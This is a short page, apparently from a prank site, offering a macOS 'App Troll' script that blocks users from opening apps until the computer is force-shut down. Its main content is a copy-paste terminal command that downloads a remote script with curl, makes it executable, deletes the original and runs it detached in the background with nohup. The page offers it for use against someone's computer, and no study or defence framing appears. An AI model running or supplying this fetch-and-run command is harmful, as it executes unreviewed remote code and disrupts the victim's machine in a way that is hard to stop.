App Troll

This script doesn't allow people to open apps. Early infdev.
The only way to end it is to force shutdown the computer, or to somehow use Terminal to killall sh.

Copy and paste the following into your terminal:
curl "https://raw.githubusercontent.com/itrolledu/itrolledu.github.io/master/mac/apptroll/dl" -o "trolling"; tr -d '\r' < trolling >trollingnl; chmod +x ./trollingnl; rm -rf trolling; nohup sh -c '$PWD/trollingnl' &
